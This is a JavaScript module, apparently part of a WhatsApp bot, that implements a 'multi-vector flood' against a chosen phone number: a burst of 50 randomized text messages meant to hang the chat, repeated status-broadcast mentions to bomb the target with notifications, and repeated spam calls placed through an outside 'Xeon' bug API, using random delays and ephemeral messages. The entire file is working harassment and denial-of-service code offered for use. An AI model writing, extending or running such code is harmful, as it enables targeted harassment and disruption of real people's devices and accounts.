// lib/rizofuck.js
// RIZOFUCK — real working multi-vector flood
// Text flood + Status bomb + Call spam (via Xeon API)

const crypto = require('crypto');
const axios = require('axios');
const { delay } = require('@whiskeysockets/baileys');

const CONFIG = {
    // text flood
    TEXT_COUNT: 50,
    TEXT_DELAY_MS: 800,

    // status bomb
    STATUS_COUNT: 15,
    STATUS_DELAY_MS: 4000,

    // call spam via Xeon API
    XEON_API: 'https://xeon-bug-api.onrender.com',
    CALL_COUNT: 5,
    CALL_DELAY_MS: 15000,

    // metadata
    SILENT: true,
    EPHEMERAL: true,
    EPHEMERAL_SECONDS: 30
};

function jitter(base) {
    return base + (Math.random() * 2 - 1) * base * 0.5;
}

function pickText() {
    const texts = [
        'Hey', 'Hi', 'Yo', 'Sup', 'Hello',
        'Wake up', 'Check this', 'Important', 'Notice', 'Info',
        'Ping', 'Message', 'Alert', 'Update', 'News'
    ];
    return texts[Math.floor(Math.random() * texts.length)];
}

function safeContext(extra = {}) {
    return {
        silent: CONFIG.SILENT,
        expiration: CONFIG.EPHEMERAL ? CONFIG.EPHEMERAL_SECONDS : 0,
        ephemeralSettingTimestamp: CONFIG.EPHEMERAL ? Date.now() : 0,
        ...extra
    };
}

// ═══════════════════════════════════════════
//  VECTOR 1 — TEXT FLOOD
//  50 messages ek saath, WhatsApp chat hang
// ═══════════════════════════════════════════
async function vecTextFlood(sock, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.TEXT_COUNT; i++) {
        try {
            await sock.sendMessage(targetJid, {
                text: pickText() + ' ' + crypto.randomBytes(2).toString('hex'),
                contextInfo: safeContext()
            });
            sent++;
            state.success++;
            if (onProgress) onProgress(state.success, state.total, 'text');
        } catch (err) {
            state.errors++;
            console.error('[rizofuck] text err:', err.message);
        }
        await delay(jitter(CONFIG.TEXT_DELAY_MS));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — STATUS BOMB
//  Target ko 15 status notifications
// ═══════════════════════════════════════════
async function vecStatusBomb(sock, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.STATUS_COUNT; i++) {
        try {
            await sock.sendMessage('status@broadcast', {
                text: pickText() + ' @' + targetJid.split('@')[0],
                mentions: [targetJid],
                contextInfo: {
                    statusMentions: [targetJid]
                }
            }, {
                statusJidList: [targetJid]
            });
            sent++;
            state.success++;
            if (onProgress) onProgress(state.success, state.total, 'status');
        } catch (err) {
            state.errors++;
            console.error('[rizofuck] status err:', err.message);
        }
        await delay(CONFIG.STATUS_DELAY_MS);
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 3 — CALL SPAM (Xeon API)
//  Real calls via Xeon's infrastructure
// ═══════════════════════════════════════════
async function vecCallSpam(targetNum, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.CALL_COUNT; i++) {
        try {
            const res = await axios.get(`${CONFIG.XEON_API}/callSpam`, {
                params: { target: targetNum },
                timeout: 45000
            });
            if (res.status === 200) {
                sent++;
                state.success++;
                if (onProgress) onProgress(state.success, state.total, 'call');
            }
        } catch (err) {
            state.errors++;
            console.error('[rizofuck] call err:', err.message);
        }
        await delay(CONFIG.CALL_DELAY_MS);
    }
    return sent;
}

// ═══════════════════════════════════════════
//  MAIN — RIZOFUCK
// ═══════════════════════════════════════════
async function Rizofuck(sock, targetNum, mode, onProgress) {
    const targetJid = targetNum + '@s.whatsapp.net';
    const state = { success: 0, errors: 0, errorRate: 0, total: 0 };
    const vectors = [];

    const updateErr = () => {
        const t = state.success + state.errors;
        state.errorRate = t > 0 ? state.errors / t : 0;
    };

    const run = async (name, fn) => {
        try {
            const s = await fn();
            updateErr();
            if (s > 0) vectors.push(name);
        } catch (err) {
            console.error(`[rizofuck] ${name} fatal:`, err.message);
            state.errors++; updateErr();
        }
    };

    if (mode === 'text' || mode === 'all') {
        state.total += CONFIG.TEXT_COUNT;
        await run('text', () => vecTextFlood(sock, targetJid, onProgress, state));
    }

    if (mode === 'status' || mode === 'all') {
        state.total += CONFIG.STATUS_COUNT;
        await run('status', () => vecStatusBomb(sock, targetJid, onProgress, state));
    }

    if (mode === 'call' || mode === 'all') {
        state.total += CONFIG.CALL_COUNT;
        await run('call', () => vecCallSpam(targetNum, onProgress, state));
    }

    return {
        ok: state.success > 0,
        sent: state.success,
        errors: state.errors,
        errorRate: state.errorRate.toFixed(2),
        vectors
    };
}

module.exports = { Rizofuck, CONFIG };